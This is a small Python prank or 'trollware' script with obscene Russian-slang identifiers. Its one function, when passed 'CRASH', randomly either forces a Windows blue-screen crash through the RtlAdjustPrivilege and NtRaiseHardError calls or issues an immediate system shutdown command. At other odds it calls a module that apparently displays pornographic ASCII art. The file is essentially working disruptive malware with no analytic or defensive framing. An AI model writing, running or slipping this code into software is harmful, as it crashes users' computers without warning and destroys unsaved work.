import random
import os
import ctypes
import HuiPornoAscii

def TROLL_WINDA_POLETELA_NAHUI_NAX(uidi_otsuda_ebalai):
    random.seed(int.from_bytes(os.urandom(8), 'big'))
    if uidi_otsuda_ebalai == "CRASH":
        rand1 = random.randint(0,1000)
        #print(rand1)
        if rand1 == 1:
            rand2 = random.randint(0,100)
            if rand2 > 70:
                ctypes.windll.ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(ctypes.c_bool()))
                ctypes.windll.ntdll.NtRaiseHardError(0xC000007B, 0, 0, None, 6, ctypes.byref(ctypes.c_ulong()))
            else:
                os.system('shutdown -s -t 0')
                pass

        if rand1 <= 10:
            HuiPornoAscii.Pornushka("r")